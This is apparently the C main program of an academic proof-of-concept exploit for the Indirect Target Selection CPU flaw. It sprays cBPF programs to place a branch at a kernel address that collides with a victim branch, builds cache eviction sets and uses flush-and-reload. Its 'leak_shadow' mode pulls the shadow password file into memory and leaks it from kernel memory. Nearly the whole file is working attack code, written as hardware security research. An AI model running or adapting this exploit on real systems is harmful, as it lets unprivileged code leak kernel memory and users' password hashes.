/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <signal.h>
#include <pthread.h>

#include "common.h"
#include "targets.h"
#include "flush_and_reload.h"
#include "cbpf.h"
#include "branch_eviction.h"
#include "collide_branch.h"
#include "modules_orcale.h"

#include "../../../common/l2_eviction/evict_l2.h"
#include "../../../common/kaslr_prefetch/kaslr_prefetch.h"



#define TEST_ITERATIONS 10000

uint8_t * get_phys_map_start() {

    int fd;
    char buf[18];
    uint8_t * address;

    if (access(PATH_PHYS_MAP, F_OK) == 0) {
        fd = open(PATH_PHYS_MAP, O_RDONLY);
        assert(fd);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_PHYS_MAP);
        exit(EXIT_FAILURE);
    }

    assert(read(fd, buf, 18));

    assert(sscanf(buf, "%lx", (uint64_t *) &address) == 1);

    close(fd);

    return address;

}

void load_shadow_file() {
    // ------------------------------------------------------------------------
    // Trigger passwd to bring it in memory

    char system_str[100];
    sprintf(system_str, "taskset -c 1 passwd -S 2>&1");
    // Output once the output to terminal
    (void) (system(system_str) + 1);

    sprintf(system_str, "taskset -c 1 passwd -S 2>&1 > /dev/null");
    for (int i = 0; i < 10; i++) {
        (void) (system(system_str) + 1);
    }
}

void initialize_victim_region_addresses(struct config * cfg) {

    cfg->victim_branch_address = (uint64_t) cfg->text_start + VICTIM_BRANCH_PC_OFFSET;
    cfg->speculation_target_address = (uint64_t)  cfg->text_start + SPECULATION_TARGET_PC_OFFSET;
    cfg->leak_gadget_address = (uint64_t)  cfg->text_start + LEAK_GADGET_PC_OFFSET;

    cfg->mmap_file_hook_address = (uint64_t) cfg->text_start + MMAP_FILE_HOOK_PC_OFFSET;
    cfg->mmap_file_hook_first_entry = (uint64_t) cfg->text_start + MMAP_FILE_HOOK_FIRST_ENTRY_PC_OFFSET;
    cfg->base_address_offset = (uint64_t) BASE_ADDRESS_OFFSET;


    printf("%20s: %#18lx\n", "Victim Branch", cfg->victim_branch_address);
    printf("%20s: %#18lx\n", "Speculation Target", cfg->speculation_target_address);
    printf("%20s: %#18lx\n", "Leak gadget", cfg->leak_gadget_address);
    printf("%20s: %#18lx\n", "MMAP hook (to evict)", cfg->mmap_file_hook_address);
    printf("%20s: %#18lx\n", "hook entry(to evict)", cfg->mmap_file_hook_first_entry);
    printf("%20s: %#18lx\n", "Base Offset", cfg->base_address_offset);

    return;

}

uint64_t get_first_colliding_address(uint64_t victim_branch, uint64_t module_region_start) {

    uint64_t train_address = module_region_start;
    uint64_t victim_tag = get_tag_for_address(victim_branch);


    while (get_tag_for_address(train_address) != victim_tag)
    {
        train_address += 1LU << TAG_PART_1_START;
    }

    train_address = (train_address & ~SET_MASK) | (victim_branch & SET_MASK);

    // static target offset, matches with victim offset (0x1b)
    train_address += 0x24;

    assert(train_address > module_region_start);

    printf("      VICTIM PC: %#18lx TAG: 0x%03lx SET: 0x%03lx OFFSET: 0x%02lx\n", victim_branch, get_tag_for_address(victim_branch), get_set_for_address(victim_branch), get_offset_for_address(victim_branch));
    printf("      TRAIN  PC: %#18lx TAG: 0x%03lx SET: 0x%03lx OFFSET: 0x%02lx\n", train_address, get_tag_for_address(train_address), get_set_for_address(train_address), get_offset_for_address(train_address));

    return train_address;

}

// To goal is to allocate enough cBPF programs such that the next program
// will be allocated in our targeted address
int reach_target_address(struct config * cfg) {

    uint64_t new_module, next_program_addr;
    uint64_t prev_module = find_last_mapped_module_address();

    uint64_t i = 0;
    uint64_t offset = 0;

    printf("------------------------------------------------------\n");

    printf("[-] %20s: %#18lx\n", "Old last mapped module region", prev_module);
    printf("[+] Filling up gaps...\n");

    // lets reserve 2MB at the start to fill some holes
    fork_reserve_n_bytes((1024 * 1024 * 2));
    usleep(1000);

    prev_module = find_last_mapped_module_address();

    printf("[-] %20s: %#18lx\n", "New last mapped module region", prev_module);

    printf("--> We insert 4k programs until a new 2MB chunk is allocated\n");

    do
    {
        fork_insert_program_4K();
        usleep(1000);
        new_module = find_last_mapped_module_address();
        i++;

    } while (prev_module == new_module);

    printf("[-] %20s: %#18lx\n", "New last mapped module region", new_module);
    printf("[+] Reserved in total %lu pages (Size %luK) before new 2MB chunk was allocated\n", i, i * 4);

    next_program_addr = new_module - HUGE_PAGE_SIZE + 0x1000;

    printf("--> Next program will be allocated at %#18lx\n", next_program_addr);

    printf("------------------------------------------------------\n");
    printf("Selected colliding training addresses:\n");

    cfg->train_address = get_first_colliding_address(cfg->victim_branch_address, next_program_addr);
    cfg->train_target = (cfg->train_address & ~SHORT_BITS_MASK) | (cfg->speculation_target_address & SHORT_BITS_MASK);
    printf("   TRAIN TARGET: %#18lx\n",cfg->train_target);

    printf("------------------------------------------------------\n");

    offset = cfg->train_address - next_program_addr;

    printf("[-] Offset between last mapped module and target: %luB (%lu Pages or %lu * 2 MB)\n", offset, offset / 4096, offset / 1024 / 1024 / 2);

    uint64_t n_huge_pages = offset / 1024 / 1024 / 2;
    printf("Reserving %ld huge_pages...\n", n_huge_pages);

    fork_reserve_n_bytes((n_huge_pages * 1024 * 1024 * 2));

    usleep(1000);

    new_module = find_last_mapped_module_address();
    next_program_addr = new_module - HUGE_PAGE_SIZE + 0x1000;
    printf("[-] %20s: %#18lx\n", "Current last mapped module region", new_module);
    printf("--> Next program will be allocated at %#18lx\n", next_program_addr);

    assert(cfg->train_address > next_program_addr);

    offset = cfg->train_address - next_program_addr; // TODO: CORRECT??
    printf("[-] Offset between last mapped module and target: %luB (%lu Pages or %lu * 2 MB)\n", offset, offset / 4096, offset / 1024 / 1024 / 2);


    printf("--> We reserve the last pages upto or target, but we should stay in the same 2MB page...\n");

    fork_reserve_n_bytes(offset & ~(0xfffLU));

    usleep(1000);

    new_module = find_last_mapped_module_address();
    printf("%20s: %#18lx\n", "[-] Current last mapped module region", new_module);


    next_program_addr = new_module - HUGE_PAGE_SIZE + 0x1000 + (offset & ~(0xfffLU));

    printf("--> Next cBPF program will be placed at 0x%lx (Colliding address)\n", next_program_addr);
    printf("--> Offset to train address: 0x%lx. Hole between train branch and train target: 0x%lx\n", cfg->train_address - next_program_addr, cfg->train_target  - cfg->train_address);

}


// ----------------------------------------------------------------------------
// MAIN
//
// ----------------------------------------------------------------------------


int main(int argc, char **argv)
{
    struct config cfg = {0};
    uint64_t time_start;
    int opt;
    pthread_t tid;
    void *status;
    int use_proc_map = 0;

     while ((opt = getopt(argc, argv, "c:o:s:p")) != -1) {
        switch (opt) {
            case 'p': use_proc_map = 1; break;
            default:
                printf("Usage:\n"
                "%s {leak_shadow, leak_dummy, test_rate} [options]\n"
                    "  -p                 Enable the use of proc pagemap (sudo)\n"
                    , argv[0]);
                exit(1);
        }
    }


    if (optind < argc) {

        if(strcmp(argv[optind], "test_rate") == 0) {
            cfg.leak_mode = 0;
        } else if(strcmp(argv[optind], "leak_dummy") == 0) {
            cfg.leak_mode = 1;
        } else if(strcmp(argv[optind], "leak_shadow") == 0) {
            cfg.leak_mode = 2;
        } else {
            printf("Invalid leakage mode, choose between: \n- test_rate \n- leak_dummy \n- leak_shadow\n");
            exit(0);
        }
    }

    switch (cfg.leak_mode) {
    case 0:
        printf("Testing the leakage rate\n");
        break;
    case 1:
        printf("Leaking a dummy secret\n");
        break;
    case 2:
        printf("Leaking the shadow file\n");
        load_shadow_file();
        break;
    default:
        break;
    }

    printf("================== ENVIRONMENT INFO ===================\n");

    (system("lscpu | grep '^Model name' | awk '{$1=$1}1'") + 1);
    (system("echo -n 'Linux version: ' && uname -r") + 1);
    (system("echo 'Linux spectre_v2 mitigation info:' && echo -n '- ' && cat /sys/devices/system/cpu/vulnerabilities/spectre_v2 | cut -d' ' -f2-") + 1);

    int seed = time(0);
    // printf("Seed: %d\n", seed);
    srand(seed);

    // ------------------------------------------------------------------------
    // Setup buffers + fd's

#if DEBUG
    if (access(PATH_LAST_MAPPED_MODULE, F_OK) == 0) {
        cfg.fd_last_mapped_module = open(PATH_LAST_MAPPED_MODULE, O_RDONLY);
        assert(cfg.fd_last_mapped_module);
    } else {
        printf("Error: File %s not found\n", PATH_LAST_MAPPED_MODULE);
        return 1;
    }
#endif

    // ------------------------------------------------------------------------
    // We pin to idle core

    pin_to_core(IDLE_CORE);

    // ------------------------------------------------------------------------
    // Allocate a huge page

    cfg.phys_start = (uint8_t *) find_phys_map_start();

    printf("======================== Setup ========================\n");
    printf("%20s: %#18lx\n", "Direct Map Start", (uint64_t) cfg.phys_start);
    // if we run sudo anyways, we just do a double check
#if DEBUG
    assert(cfg.phys_start  ==  get_phys_map_start());
#endif

    uint64_t mem_total = get_mem_total();
    cfg.phys_end = cfg.phys_start + mem_total + (1LU << 30) + (uint64_t) (mem_total * 0.2);

    cfg.text_start = (uint8_t *) find_text_map_start();
    printf("%20s: %#18lx\n", "Kernel Text Start", (uint64_t) cfg.text_start);

    initialize_victim_region_addresses(&cfg);

    initialize_cbpf();
    reach_target_address(&cfg);

    cfg.evicting_branch = (void *) initialize_evicting_branch(cfg.victim_branch_address);
#ifdef USE_BRANCH_CONTENTION_LIST
    // Our observations showed we do not need a contention set for this exploit,
    // seemingly there is enough contention on the set with 32-bit targets such
    // that a short-entry will be inserted. You can still enable this if needed
    // (define in targets.h).
    initialize_branch_contention_set((void *) &cfg.branch_contention_list,  cfg.train_address);
#endif

    // ------------------------------------------------------------------------
    // Build L2 eviction set to enlarger the speculation window
    build_ev_set_l2((uint64_t) cfg.mmap_file_hook_address, (void *) &cfg.ev_set_l2_hook);
    build_ev_set_l2((uint64_t) cfg.mmap_file_hook_first_entry, (void *) &cfg.ev_set_l2_entry);


    // ------------------------------------------------------------------------
    // Find the kernel address of our huge page

    cfg.ind_map = allocate_huge_page();
    cfg.fr_buf = cfg.ind_map + 0x2000;
    cfg.reload_addr = cfg.fr_buf;

    memset(cfg.fr_buf, 0x94, 0x1000);

    if (use_proc_map) {

        cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));
        assert((uint64_t) cfg.ind_map_kern % HUGE_PAGE_SIZE == 0);

        printf("%20s: %#18lx | %20s: %#18lx\n", "User Huge Page", (uint64_t) cfg.ind_map, "Kernel Huge Page", (uint64_t) cfg.ind_map_kern);

        cfg.fr_buf_kern = cfg.ind_map_kern + 0x2000;
        cfg.secret_addr_kern = cfg.ind_map_kern + 0x10000;

        printf("%20s: %#18lx | %20s: %#18lx\n", "User FR_BUF", (uint64_t) cfg.fr_buf, "Kernel FR_BUF", (uint64_t) cfg.fr_buf_kern);

        set_load_chain_leak_secret(&cfg);

        // comment/uncomment to search with non-zero secret
        *((uint32_t *) (cfg.ind_map + 0x10000)) = 0xdeadLU;
        *cfg.ind_base_addr = (uint64_t) cfg.fr_buf_kern - cfg.base_address_offset - (0xdeadLU << 4);

        printf("=========== Colliding cBPF training program ===========\n");
        printf("--> We start reinserting the cBPF with the training branch\n");
        printf("--> until the branch is placed at the correct colliding address\n");

        uint64_t idx = 0;

        while (1)
        {
            pthread_create(&tid, NULL, thread_perform_attack, (void *)&cfg);
            pthread_join(tid, &status);

            if (status == 0) {
                printf("Total reinsertion tries: %lu\n", idx);
                break;
            }
            idx++;

            printf("Reinsertion tries: %lu\r", idx);
            fflush(stdout);
        }

    } else {

        find_hp_kern_address_and_attack(&cfg);
    }

    printf("Done!\n");

    kill(0, SIGQUIT);

}
